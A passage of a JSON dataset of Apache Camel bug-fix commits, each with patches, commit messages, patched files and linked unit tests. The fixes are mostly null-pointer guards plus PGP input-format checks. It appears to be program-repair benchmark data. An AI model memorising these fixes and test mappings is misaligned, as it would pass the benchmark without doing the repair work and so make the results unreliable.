                "patch": "@@ -136,7 +136,13 @@ public boolean equals(Object object) {\n \n     @Override\n     public String toString() {\n-        return String.format(\"Endpoint[%s]\", URISupport.sanitizeUri(getEndpointUri()));\n+        String value = null;\n+        try {\n+            value = getEndpointUri();\n+        } catch (RuntimeException e) {\n+            // ignore any exception and use null for building the string value\n+        }\n+        return String.format(\"Endpoint[%s]\", URISupport.sanitizeUri(value));\n     }\n \n     /**",
                "raw_url": "https://github.com/apache/camel/raw/9122881581c14f2e4c3fe32ae6660d35bcccf34a/camel-core/src/main/java/org/apache/camel/impl/DefaultEndpoint.java",
                "sha": "badd48ecb63d43f25c9606b55dda8048f361467e",
                "status": "modified"
            },
            {
                "additions": 27,
                "blob_url": "https://github.com/apache/camel/blob/9122881581c14f2e4c3fe32ae6660d35bcccf34a/camel-core/src/test/java/org/apache/camel/impl/DefaultEndpointTest.java",
                "changes": 27,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/impl/DefaultEndpointTest.java?ref=9122881581c14f2e4c3fe32ae6660d35bcccf34a",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/impl/DefaultEndpointTest.java",
                "patch": "@@ -16,7 +16,10 @@\n  */\n package org.apache.camel.impl;\n \n+import org.apache.camel.Consumer;\n import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.Processor;\n+import org.apache.camel.Producer;\n import org.apache.camel.util.URISupport;\n \n /**\n@@ -39,6 +42,14 @@ public void testSanitizeUri() {\n             URISupport.sanitizeUri(\"aws-sqs://MyQueue?accessKey=1672t4rflhnhli3&secretKey=qi472qfberu33dqjncq\"));\n     }\n \n+    public void testToString() {\n+        final String epstr = \"myep:///test\";\n+        MyEndpoint ep = new MyEndpoint();\n+        assertNotNull(ep.toString());\n+        ep.setEndpointUri(epstr);\n+        assertTrue(ep.toString().indexOf(epstr) > 0);\n+    }\n+\n     /**\n      * Ensures that the Uri was not changed because no password was found.\n      *\n@@ -48,4 +59,20 @@ private void assertSanitizedUriUnchanged(String uri) {\n         assertEquals(uri, URISupport.sanitizeUri(uri));\n     }\n \n+    private static class MyEndpoint extends DefaultEndpoint {\n+        @Override\n+        public Producer createProducer() throws Exception {\n+            return null;\n+        }\n+\n+        @Override\n+        public Consumer createConsumer(Processor processor) throws Exception {\n+            return null;\n+        }\n+\n+        @Override\n+        public boolean isSingleton() {\n+            return false;\n+        }\n+    }\n }",
                "raw_url": "https://github.com/apache/camel/raw/9122881581c14f2e4c3fe32ae6660d35bcccf34a/camel-core/src/test/java/org/apache/camel/impl/DefaultEndpointTest.java",
                "sha": "0b61ef770d53e562329a51711b1d73aa1e8eb0b5",
                "status": "modified"
            }
        ],
        "message": "CAMEL-7344: Some endpoints configured using beans may result in NPE under DEBUG mode",
        "parent": "https://github.com/apache/camel/commit/a59414d3751a6ba0946dcc60193c6d32db92a115",
        "patched_files": [
            "DefaultEndpoint.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultEndpointTest.java"
        ]
    },
    "camel_927bb8a": {
        "bug_id": "camel_927bb8a",
        "commit": "https://github.com/apache/camel/commit/927bb8a4ce19d72c016a4653bc5e93dd4ab61102",
        "file": [
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/927bb8a4ce19d72c016a4653bc5e93dd4ab61102/components/camel-dozer/src/main/java/org/apache/camel/component/dozer/CustomMapper.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-dozer/src/main/java/org/apache/camel/component/dozer/CustomMapper.java?ref=927bb8a4ce19d72c016a4653bc5e93dd4ab61102",
                "deletions": 2,
                "filename": "components/camel-dozer/src/main/java/org/apache/camel/component/dozer/CustomMapper.java",
                "patch": "@@ -105,9 +105,9 @@ Object mapCustom(Object source) {\n         }\n \n         Object customObj;\n-        Method method = null;\n+        Method method;\n         try {\n-            Class<?> customClass = resolver.resolveClass(className);\n+            Class<?> customClass = resolver.resolveMandatoryClass(className);\n             customObj = customClass.newInstance();\n \n             // If a specific mapping operation has been supplied use that",
                "raw_url": "https://github.com/apache/camel/raw/927bb8a4ce19d72c016a4653bc5e93dd4ab61102/components/camel-dozer/src/main/java/org/apache/camel/component/dozer/CustomMapper.java",
                "sha": "5924706b49d970e7a6324f068e1f074f69bd1b53",
                "status": "modified"
            }
        ],
        "message": "CAMEL-9710: Avoid NPE as the class is mandatory",
        "parent": "https://github.com/apache/camel/commit/6f916d80003d4f4ad11a66c81cf3ebb668d550be",
        "patched_files": [
            "CustomMapper.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CustomMapperTest.java"
        ]
    },
    "camel_92e3c4f": {
        "bug_id": "camel_92e3c4f",
        "commit": "https://github.com/apache/camel/commit/92e3c4f43ec4dc95b41698166d5c1c1c0ff358bb",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/92e3c4f43ec4dc95b41698166d5c1c1c0ff358bb/components/camel-jms/src/test/java/org/apache/camel/component/jms/JmsBindingTest.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jms/src/test/java/org/apache/camel/component/jms/JmsBindingTest.java?ref=92e3c4f43ec4dc95b41698166d5c1c1c0ff358bb",
                "deletions": 2,
                "filename": "components/camel-jms/src/test/java/org/apache/camel/component/jms/JmsBindingTest.java",
                "patch": "@@ -23,8 +23,9 @@\n \n import org.apache.activemq.command.ActiveMQBlobMessage;\n import org.apache.activemq.command.ActiveMQTextMessage;\n+import org.apache.camel.Exchange;\n import org.apache.camel.impl.DefaultCamelContext;\n-import org.apache.camel.impl.DefaultExchange;\n+\n import org.junit.Before;\n import org.junit.Test;\n import org.junit.runner.RunWith;\n@@ -62,7 +63,7 @@ public void noEndpointTest() throws Exception {\n         ActiveMQTextMessage message = new ActiveMQTextMessage();\n         message.setText(\"test\");\n         DefaultCamelContext camelContext = new DefaultCamelContext();\n-        DefaultExchange exchange = new DefaultExchange(camelContext);\n+        Exchange exchange = camelContext.getEndpoint(\"jms:queue:foo\").createExchange();\n         exchange.getIn().setBody(\"test\");\n         exchange.getIn().setHeader(\"JMSCorrelationID\", null);\n         testBindingWithoutEndpoint.appendJmsProperties(message, exchange);",
                "raw_url": "https://github.com/apache/camel/raw/92e3c4f43ec4dc95b41698166d5c1c1c0ff358bb/components/camel-jms/src/test/java/org/apache/camel/component/jms/JmsBindingTest.java",
                "sha": "9562b8bf6cd7d96a754d5751262c28e56596b913",
                "status": "modified"
            }
        ],
        "message": "[CAMEL-14156] Avoid NPE with endpoint is null in JmsBinding (#3328)",
        "parent": "https://github.com/apache/camel/commit/5528d3c1568a7d3da30866c4d0f23b0c72c22303",
        "patched_files": [
            "JmsBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "JmsBindingTest.java"
        ]
    },
    "camel_94d6f0d": {
        "bug_id": "camel_94d6f0d",
        "commit": "https://github.com/apache/camel/commit/94d6f0dd260583e89a2a66db1c4c4d25a051a361",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/94d6f0dd260583e89a2a66db1c4c4d25a051a361/camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java?ref=94d6f0dd260583e89a2a66db1c4c4d25a051a361",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java",
                "patch": "@@ -1134,7 +1134,7 @@ public static boolean isAssignableFrom(Class<?> a, Class<?> b) {\n      * @return {@code true} if the given type is a Java primitive array type\n      */\n     public static boolean isPrimitiveArrayType(Class<?> clazz) {\n-        if (clazz.isArray()) {\n+        if (clazz != null && clazz.isArray()) {\n             return clazz.getComponentType().isPrimitive();\n         }\n         return false;",
                "raw_url": "https://github.com/apache/camel/raw/94d6f0dd260583e89a2a66db1c4c4d25a051a361/camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java",
                "sha": "c0adf7ce829f7ec2d03dfa4ae85c0c6d97a68cef",
                "status": "modified"
            }
        ],
        "message": "Add an NPE guard",
        "parent": "https://github.com/apache/camel/commit/2b6b390e47b2586c32ea7fce4734702ecf3a9b2d",
        "patched_files": [
            "ObjectHelper.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ObjectHelperTest.java"
        ]
    },
    "camel_953bed1": {
        "bug_id": "camel_953bed1",
        "commit": "https://github.com/apache/camel/commit/953bed1772d5b20e0c4c1b284ec5d47c5c8d6a0a",
        "file": [
            {
                "additions": 15,
                "blob_url": "https://github.com/apache/camel/blob/953bed1772d5b20e0c4c1b284ec5d47c5c8d6a0a/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfExchange.java",
                "changes": 23,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfExchange.java?ref=953bed1772d5b20e0c4c1b284ec5d47c5c8d6a0a",
                "deletions": 8,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfExchange.java",
                "patch": "@@ -28,26 +28,26 @@\n /**\n  * An {@link Exchange} for working with Apache CXF which expoes the underlying\n  * CXF messages via {@link #getInMessage()} and {@link #getOutMessage()} along with the\n- * {@link #getExchange()} \n+ * {@link #getExchange()}\n  *\n  * @version $Revision$\n  */\n-public class CxfExchange extends DefaultExchange {   \n+public class CxfExchange extends DefaultExchange {\n     private Exchange exchange;\n \n     public CxfExchange(CamelContext context, Exchange exchange) {\n-        super(context);        \n+        super(context);\n         this.exchange = exchange;\n \n         setIn(new CxfMessage(exchange.getInMessage()));\n         setOut(new CxfMessage(exchange.getOutMessage()));\n         if (exchange.getInFaultMessage() != null) {\n             setFault(new CxfMessage(exchange.getInFaultMessage()));\n-        }    \n+        }\n     }\n \n     public CxfExchange(CamelContext context, ExchangePattern pattern) {\n-        super(context, pattern);        \n+        super(context, pattern);\n     }\n \n     public CxfExchange(CamelContext context, ExchangePattern pattern, Message inMessage) {\n@@ -56,13 +56,20 @@ public CxfExchange(CamelContext context, ExchangePattern pattern, Message inMess\n \n         setIn(new CxfMessage(inMessage));\n         if (exchange != null) {\n-            setOut(new CxfMessage(exchange.getOutMessage()));\n+            if (exchange.getOutMessage()!= null) {\n+                setOut(new CxfMessage(exchange.getOutMessage()));\n+            }\n             if (exchange.getInFaultMessage() != null) {\n                 setFault(new CxfMessage(exchange.getInFaultMessage()));\n-            }    \n+            }\n         }\n     }\n \n+    @Override\n+    public org.apache.camel.Exchange newInstance() {\n+        return new CxfExchange(this.getContext(), this.getExchange());\n+    }\n+\n     @Override\n     public CxfMessage getIn() {\n         return (CxfMessage) super.getIn();\n@@ -82,7 +89,7 @@ public CxfMessage getOut(boolean lazyCreate) {\n     public CxfMessage getFault() {\n         return (CxfMessage) super.getFault();\n     }\n-    \n+\n     @Override\n     protected org.apache.camel.Message createFaultMessage() {\n         return new CxfMessage();",
                "raw_url": "https://github.com/apache/camel/raw/953bed1772d5b20e0c4c1b284ec5d47c5c8d6a0a/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfExchange.java",
                "sha": "6166ceb48d7ffd1a9e20e2095e572c9a0ce285a2",
                "status": "modified"
            },
            {
                "additions": 13,
                "blob_url": "https://github.com/apache/camel/blob/953bed1772d5b20e0c4c1b284ec5d47c5c8d6a0a/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfMessage.java",
                "changes": 15,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfMessage.java?ref=953bed1772d5b20e0c4c1b284ec5d47c5c8d6a0a",
                "deletions": 2,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfMessage.java",
                "patch": "@@ -25,7 +25,7 @@\n /**\n  * An Apache CXF {@link Message} which provides access to the underlying CXF\n  * features\n- * \n+ *\n  * @version $Revision$\n  */\n public class CxfMessage extends DefaultMessage {\n@@ -43,6 +43,17 @@ public CxfMessage(Message cxfMessage) {\n         }\n     }\n \n+    @Override\n+    public void copyFrom(org.apache.camel.Message that) {\n+        setMessageId(that.getMessageId());\n+        setBody(that.getBody());\n+        getHeaders().putAll(that.getHeaders());\n+        if (that instanceof CxfMessage) {\n+            CxfMessage orig = (CxfMessage) that;\n+            setMessage(orig.getMessage());\n+        }\n+    }\n+\n     @Override\n     public String toString() {\n         if (cxfMessage != null) {\n@@ -59,7 +70,7 @@ public CxfExchange getExchange() {\n \n     /**\n      * Returns the underlying CXF message\n-     * \n+     *\n      * @return the CXF message\n      */\n     public Message getMessage() {",
                "raw_url": "https://github.com/apache/camel/raw/953bed1772d5b20e0c4c1b284ec5d47c5c8d6a0a/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfMessage.java",
                "sha": "668a1a6db60eb5eb22fe225af2aa5bccc9a07cd8",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/953bed1772d5b20e0c4c1b284ec5d47c5c8d6a0a/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfPayLoadMessageRouterTest.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfPayLoadMessageRouterTest.java?ref=953bed1772d5b20e0c4c1b284ec5d47c5c8d6a0a",
                "deletions": 1,
                "filename": "components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfPayLoadMessageRouterTest.java",
                "patch": "@@ -24,7 +24,7 @@\n     protected RouteBuilder createRouteBuilder() {\n         return new RouteBuilder() {\n             public void configure() {\n-                from(routerEndpointURI).to(serviceEndpointURI);              \n+                from(routerEndpointURI).to(\"log:org.apache.camel?level=DEBUG\").to(serviceEndpointURI);\n             }\n         };\n     }",
                "raw_url": "https://github.com/apache/camel/raw/953bed1772d5b20e0c4c1b284ec5d47c5c8d6a0a/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfPayLoadMessageRouterTest.java",
                "sha": "b6d1be460702fc5de42d541502dcac126eaeab4b",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/953bed1772d5b20e0c4c1b284ec5d47c5c8d6a0a/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfRawMessageRouterTest.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfRawMessageRouterTest.java?ref=953bed1772d5b20e0c4c1b284ec5d47c5c8d6a0a",
                "deletions": 1,
                "filename": "components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfRawMessageRouterTest.java",
                "patch": "@@ -24,7 +24,7 @@\n     protected RouteBuilder createRouteBuilder() {\n         return new RouteBuilder() {\n             public void configure() {\n-                from(routerEndpointURI).to(serviceEndpointURI);              \n+                from(routerEndpointURI).to(\"log:org.apache.camel?level=DEBUG\").to(serviceEndpointURI);\n             }\n         };\n     }",
                "raw_url": "https://github.com/apache/camel/raw/953bed1772d5b20e0c4c1b284ec5d47c5c8d6a0a/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfRawMessageRouterTest.java",
                "sha": "f11eba1cf4d4beb228ca7568d78f4fd5f9d70e6d",
                "status": "modified"
            },
            {
                "additions": 24,
                "blob_url": "https://github.com/apache/camel/blob/953bed1772d5b20e0c4c1b284ec5d47c5c8d6a0a/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfRouterTest.java",
                "changes": 48,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfRouterTest.java?ref=953bed1772d5b20e0c4c1b284ec5d47c5c8d6a0a",
                "deletions": 24,
                "filename": "components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfRouterTest.java",
                "patch": "@@ -32,21 +32,21 @@\n     protected static final String ROUTER_ADDRESS = \"http://localhost:9000/router\";\n     protected static final String SERVICE_ADDRESS = \"http://localhost:9002/helloworld\";\n     protected static final String SERVICE_CLASS = \"serviceClass=org.apache.camel.component.cxf.HelloService\";\n-    \n+\n     private String routerEndpointURI = \"cxf://\" + ROUTER_ADDRESS + \"?\" + SERVICE_CLASS + \"&dataFormat=POJO\";\n     private String serviceEndpointURI = \"cxf://\" + SERVICE_ADDRESS + \"?\" + SERVICE_CLASS + \"&dataFormat=POJO\";\n-    \n+\n     private ServerImpl server;\n     private Bus bus;\n-    \n-    \n+\n+\n     @Override\n     protected void setUp() throws Exception {\n-        super.setUp();       \n-        bus = BusFactory.getDefaultBus();      \n+        super.setUp();\n+        bus = BusFactory.getDefaultBus();\n         startService();\n     }\n-    \n+\n     protected void startService() {\n         //start a service\n         ServerFactoryBean svrBean = new ServerFactoryBean();\n@@ -59,47 +59,47 @@ protected void startService() {\n         server = (ServerImpl)svrBean.create();\n         server.start();\n     }\n-    \n+\n     @Override\n     protected void tearDown() throws Exception {\n         //bus.shutdown(true);\n-        BusFactory.setDefaultBus(null);        \n+        BusFactory.setDefaultBus(null);\n     }\n-  \n+\n     protected RouteBuilder createRouteBuilder() {\n         return new RouteBuilder() {\n             public void configure() {\n-                from(routerEndpointURI).to(serviceEndpointURI);              \n+                from(routerEndpointURI).to(\"log:org.apache.camel?level=DEBUG\").to(serviceEndpointURI);\n             }\n         };\n     }\n-    \n+\n     protected CamelContext createCamelContext() throws Exception {\n         return new DefaultCamelContext();\n     }\n \n-    \n-    public void testInvokingServiceFromCXFClient() throws Exception {  \n-                \n+\n+    public void testInvokingServiceFromCXFClient() throws Exception {\n+\n         ClientProxyFactoryBean proxyFactory = new ClientProxyFactoryBean();\n         ClientFactoryBean clientBean = proxyFactory.getClientFactoryBean();\n-        clientBean.setAddress(ROUTER_ADDRESS);        \n+        clientBean.setAddress(ROUTER_ADDRESS);\n         clientBean.setServiceClass(HelloService.class);\n-        clientBean.setBus(bus);        \n-        \n+        clientBean.setBus(bus);\n+\n         HelloService client = (HelloService) proxyFactory.create();\n+\n         String result = client.echo(\"hello world\");\n-        assertEquals(\"we should get the right answer from router\", \"echo hello world\", result);\n-        \n-                \n+        assertEquals(\"we should get the right answer from router\", result, \"echo hello world\");\n+\n     }\n-    \n+\n     public void testOnwayInvocation() throws Exception {\n     \tClientProxyFactoryBean proxyFactory = new ClientProxyFactoryBean();\n         ClientFactoryBean clientBean = proxyFactory.getClientFactoryBean();\n-        clientBean.setAddress(ROUTER_ADDRESS);        \n+        clientBean.setAddress(ROUTER_ADDRESS);\n         clientBean.setServiceClass(HelloService.class);\n-        clientBean.setBus(bus);        \n+        clientBean.setBus(bus);\n         HelloService client = (HelloService) proxyFactory.create();\n         int invocationCount = client.getInvocationCount();\n         client.ping();",
                "raw_url": "https://github.com/apache/camel/raw/953bed1772d5b20e0c4c1b284ec5d47c5c8d6a0a/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfRouterTest.java",
                "sha": "f9d928f4928b202772e1c60d9a4135bef3688502",
                "status": "modified"
            }
        ],
        "message": "camel-286 Fixed the NPE of the cxf router\n\ngit-svn-id: https://svn.apache.org/repos/asf/activemq/camel/trunk@611382 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/8365a8619e32415073c2930e2e48afb6b1662787",
        "patched_files": [
            "CxfMessage.java",
            "CxfExchange.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CxfRouterTest.java",
            "CxfRawMessageRouterTest.java",
            "CxfPayLoadMessageRouterTest.java"
        ]
    },
    "camel_96bcd5e": {
        "bug_id": "camel_96bcd5e",
        "commit": "https://github.com/apache/camel/commit/96bcd5e9ce4fcbc9da2756b154101ba1554336aa",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/96bcd5e9ce4fcbc9da2756b154101ba1554336aa/components/camel-kafka/src/main/java/org/apache/camel/component/kafka/KafkaProducer.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-kafka/src/main/java/org/apache/camel/component/kafka/KafkaProducer.java?ref=96bcd5e9ce4fcbc9da2756b154101ba1554336aa",
                "deletions": 1,
                "filename": "components/camel-kafka/src/main/java/org/apache/camel/component/kafka/KafkaProducer.java",
                "patch": "@@ -48,7 +48,9 @@ protected void doStop() throws Exception {\n \n     Properties getProps() {\n         Properties props = endpoint.getConfiguration().createProducerProperties();\n-        props.put(\"metadata.broker.list\", endpoint.getBrokers());\n+        if (endpoint.getBrokers() != null) {\n+            props.put(\"metadata.broker.list\", endpoint.getBrokers());\n+        }\n         return props;\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/96bcd5e9ce4fcbc9da2756b154101ba1554336aa/components/camel-kafka/src/main/java/org/apache/camel/component/kafka/KafkaProducer.java",
                "sha": "80bf94e466f18feb0adadf7b6103911057cad48f",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE",
        "parent": "https://github.com/apache/camel/commit/8d6e1032c66f6dac0f22efd2c0f94384414d8688",
        "patched_files": [
            "KafkaProducer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "KafkaProducerTest.java"
        ]
    },
    "camel_96f13a7": {
        "bug_id": "camel_96f13a7",
        "commit": "https://github.com/apache/camel/commit/96f13a74c4e961452276db5a0ddd83b2ee4ffe1b",
        "file": [
            {
                "additions": 8,
                "blob_url": "https://github.com/apache/camel/blob/96f13a74c4e961452276db5a0ddd83b2ee4ffe1b/camel-core/src/main/java/org/apache/camel/util/CamelContextHelper.java",
                "changes": 14,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/CamelContextHelper.java?ref=96f13a74c4e961452276db5a0ddd83b2ee4ffe1b",
                "deletions": 6,
                "filename": "camel-core/src/main/java/org/apache/camel/util/CamelContextHelper.java",
                "patch": "@@ -166,13 +166,15 @@ public static Endpoint getEndpointInjection(CamelContext camelContext, String ur\n      * @throws IllegalArgumentException is thrown if the property is illegal\n      */\n     public static int getMaximumCachePoolSize(CamelContext camelContext) throws IllegalArgumentException {\n-        String s = camelContext.getProperties().get(Exchange.MAXIMUM_CACHE_POOL_SIZE);\n-        if (s != null) {\n-            Integer size = camelContext.getTypeConverter().convertTo(Integer.class, s);\n-            if (size == null || size <= 0) {\n-                throw new IllegalArgumentException(\"Property \" + Exchange.MAXIMUM_CACHE_POOL_SIZE + \" must be a positive number, was: \" + s);\n+        if (camelContext != null) {\n+            String s = camelContext.getProperties().get(Exchange.MAXIMUM_CACHE_POOL_SIZE);\n+            if (s != null) {\n+                Integer size = camelContext.getTypeConverter().convertTo(Integer.class, s);\n+                if (size == null || size <= 0) {\n+                    throw new IllegalArgumentException(\"Property \" + Exchange.MAXIMUM_CACHE_POOL_SIZE + \" must be a positive number, was: \" + s);\n+                }\n+                return size;\n             }\n-            return size;\n         }\n \n         // 1000 is the default fallback",
                "raw_url": "https://github.com/apache/camel/raw/96f13a74c4e961452276db5a0ddd83b2ee4ffe1b/camel-core/src/main/java/org/apache/camel/util/CamelContextHelper.java",
                "sha": "898e598ef9ff1370e3ee1a787996579d4c6ef166",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE on startup due IoC wiring invoking static method with null CamelContext.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1077936 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/11e9c701d6645c8126b9e5310a499d80c65711f9",
        "patched_files": [
            "CamelContextHelper.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CamelContextHelperTest.java"
        ]
    },
    "camel_978b102": {
        "bug_id": "camel_978b102",
        "commit": "https://github.com/apache/camel/commit/978b102866d37fa4eb33b4ecec3cc83584905ae3",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/978b102866d37fa4eb33b4ecec3cc83584905ae3/camel-core/src/main/java/org/apache/camel/util/IntrospectionSupport.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/IntrospectionSupport.java?ref=978b102866d37fa4eb33b4ecec3cc83584905ae3",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/util/IntrospectionSupport.java",
                "patch": "@@ -534,7 +534,7 @@ public static boolean setProperty(CamelContext context, TypeConverter typeConver\n             // we did not find a setter method to use, and if we did try to use a type converter then throw\n             // this kind of exception as the caused by will hint this error\n             throw new IllegalArgumentException(\"Could not find a suitable setter for property: \" + name\n-                    + \" as there isn't a setter method with same type: \" + value.getClass().getCanonicalName()\n+                    + \" as there isn't a setter method with same type: \" + (value != null ? value.getClass().getCanonicalName() : \"[null]\")\n                     + \" nor type conversion possible: \" + typeConversionFailed.getMessage());\n         } else {\n             return false;",
                "raw_url": "https://github.com/apache/camel/raw/978b102866d37fa4eb33b4ecec3cc83584905ae3/camel-core/src/main/java/org/apache/camel/util/IntrospectionSupport.java",
                "sha": "22bb389035c389db8f4d032da378486b9bce56d0",
                "status": "modified"
            }
        ],
        "message": "Avoid potential NPE",
        "parent": "https://github.com/apache/camel/commit/9d06f956e0d07663cec1d575de97a9f9939b32b6",
        "patched_files": [
            "IntrospectionSupport.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "IntrospectionSupportTest.java"
        ]
    },
    "camel_9ea05aa": {
        "bug_id": "camel_9ea05aa",
        "commit": "https://github.com/apache/camel/commit/9ea05aae64256ad652235865ad6c0f31a00e682a",
        "file": [
            {
                "additions": 38,
                "blob_url": "https://github.com/apache/camel/blob/9ea05aae64256ad652235865ad6c0f31a00e682a/components/camel-crypto/src/main/java/org/apache/camel/converter/crypto/PGPKeyAccessDataFormat.java",
                "changes": 47,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-crypto/src/main/java/org/apache/camel/converter/crypto/PGPKeyAccessDataFormat.java?ref=9ea05aae64256ad652235865ad6c0f31a00e682a",
                "deletions": 9,
                "filename": "components/camel-crypto/src/main/java/org/apache/camel/converter/crypto/PGPKeyAccessDataFormat.java",
                "patch": "@@ -309,33 +309,50 @@ public Object unmarshal(Exchange exchange, InputStream encryptedStream) throws E\n         }\n         InputStream in = PGPUtil.getDecoderStream(encryptedStream);\n         PGPObjectFactory pgpFactory = new PGPObjectFactory(in);\n-        Object o = pgpFactory.nextObject();\n+        Object firstObject = pgpFactory.nextObject();\n         // the first object might be a PGP marker packet \n         PGPEncryptedDataList enc;\n-        if (o instanceof PGPEncryptedDataList) {\n-            enc = (PGPEncryptedDataList) o;\n+        if (firstObject instanceof PGPEncryptedDataList) {\n+            enc = (PGPEncryptedDataList) firstObject;\n         } else {\n-            enc = (PGPEncryptedDataList) pgpFactory.nextObject();\n+            Object secondObject = pgpFactory.nextObject();\n+            if (secondObject instanceof PGPEncryptedDataList) {\n+                enc = (PGPEncryptedDataList)secondObject;\n+            } else {\n+                enc = null;\n+            }\n+        } \n+        \n+        if (enc == null) {\n+            throw getFormatException();\n         }\n \n         PGPPublicKeyEncryptedData pbe = null;\n         PGPPrivateKey key = null;\n         // find encrypted data for which a private key exists in the secret key ring\n         for (int i = 0; i < enc.size() && key == null; i++) {\n-            pbe = (PGPPublicKeyEncryptedData) enc.get(i);\n+            Object encryptedData = enc.get(i);\n+            if (!(encryptedData instanceof PGPPublicKeyEncryptedData)) {\n+                throw getFormatException();\n+            }\n+            pbe = (PGPPublicKeyEncryptedData) encryptedData;\n             key = secretKeyAccessor.getPrivateKey(exchange, pbe.getKeyID());\n             if (key != null) {\n                 // take the first key\n                 break;\n             }\n         }\n         if (key == null) {\n-            throw new PGPException(\"Provided input is encrypted with unknown pair of keys.\");\n+            throw new PGPException(\"Message is encrypted with a key which could not be found in the Secret Key Ring.\");\n         }\n \n         InputStream encData = pbe.getDataStream(new JcePublicKeyDataDecryptorFactoryBuilder().setProvider(getProvider()).build(key));\n         pgpFactory = new PGPObjectFactory(encData);\n-        PGPCompressedData comData = (PGPCompressedData) pgpFactory.nextObject();\n+        Object compObj = pgpFactory.nextObject();\n+        if (!(compObj instanceof PGPCompressedData)) {\n+            throw getFormatException();\n+        }\n+        PGPCompressedData comData = (PGPCompressedData)compObj;\n         pgpFactory = new PGPObjectFactory(comData.getDataStream());\n         Object object = pgpFactory.nextObject();\n \n@@ -347,7 +364,12 @@ public Object unmarshal(Exchange exchange, InputStream encryptedStream) throws E\n             signature = null;\n         }\n \n-        PGPLiteralData ld = (PGPLiteralData) object;\n+        PGPLiteralData ld;\n+        if (object instanceof PGPLiteralData) {\n+            ld = (PGPLiteralData) object;\n+        } else {\n+            throw getFormatException();\n+        }\n         InputStream litData = ld.getInputStream();\n \n         // enable streaming via OutputStreamCache\n@@ -392,6 +414,13 @@ public Object unmarshal(Exchange exchange, InputStream encryptedStream) throws E\n         }\n     }\n \n+    private IllegalArgumentException getFormatException() {\n+        return new IllegalArgumentException(\"The input message body has an invalid format. The PGP decryption/verification processor expects a sequence of PGP packets of the form \"\n+            + \"(entries in brackets are optional and ellipses indicate repetition, comma represents  sequential composition, and vertical bar separates alternatives): \"\n+            + \"Public Key Encrypted Session Key ..., Symmetrically Encrypted Data | Sym. Encrypted and Integrity Protected Data, Compressed Data, (One Pass Signature ...,) \"\n+            + \"Literal Data, (Signature ...,)\");\n+    }\n+\n     protected PGPSignature getSignatureWithKeyId(long keyID, PGPSignatureList sigList) {\n         for (int i = 0; i < sigList.size(); i++) {\n             PGPSignature signature = sigList.get(i);\n@@ -419,7 +448,7 @@ protected PGPOnePassSignature getSignature(Exchange exchange, PGPOnePassSignatur\n         if (signatureList.isEmpty()) {\n             return null;\n         } else {\n-            throw new IllegalArgumentException(\"No public key found fitting to the signature key Id; cannot verify the 